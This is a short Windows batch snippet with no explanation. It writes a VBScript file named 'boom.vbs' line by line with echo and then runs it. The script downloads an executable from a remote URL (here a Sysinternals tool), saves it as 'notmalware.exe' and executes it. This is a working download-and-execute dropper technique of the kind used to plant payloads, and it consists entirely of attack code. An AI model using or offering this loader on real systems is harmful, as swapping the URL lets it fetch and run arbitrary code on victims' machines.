echo set file = wscript.createobject("Microsoft.XMLHTTP") > boom.vbs
echo file.open "GET", "http://live.sysinternals.com/vmmap.exe", false >> boom.vbs
echo file.send >> boom.vbs
echo set output  = createobject("ADODB.Stream") >> boom.vbs
echo output.type =1 >> boom.vbs
echo output.open >> boom.vbs
echo output.write file.responsebody >> boom.vbs
echo output.savetofile("notmalware.exe") >> boom.vbs
echo createobject("WScript.Shell").Run "notmalware.exe" >> boom.vbs
cscript boom.vbs
